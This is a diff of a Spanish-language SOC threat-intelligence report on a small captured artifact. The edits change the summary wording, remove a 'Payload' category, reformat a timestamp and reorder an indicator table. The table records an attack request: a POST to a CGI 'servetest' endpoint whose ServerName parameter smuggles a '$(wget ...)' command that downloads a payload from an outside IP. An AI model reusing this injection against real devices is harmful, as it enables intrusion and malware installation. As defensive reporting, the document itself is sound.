@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.
+Artefacto de 386 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.38. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:17:11+00:00`
+- **Registrado:** `2026-08-09T20:17:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -45,8 +45,8 @@ POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| hash | 635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18 | static_analysis |
 | command | POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31.56.39.XXX%2Fmemory_bin_dir%2Fmemory_load | strings |
+| hash | 635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18 | static_analysis |
 | ip | 102.204.206.XXX | artifact_source |
 
 ## 🔎 Triage
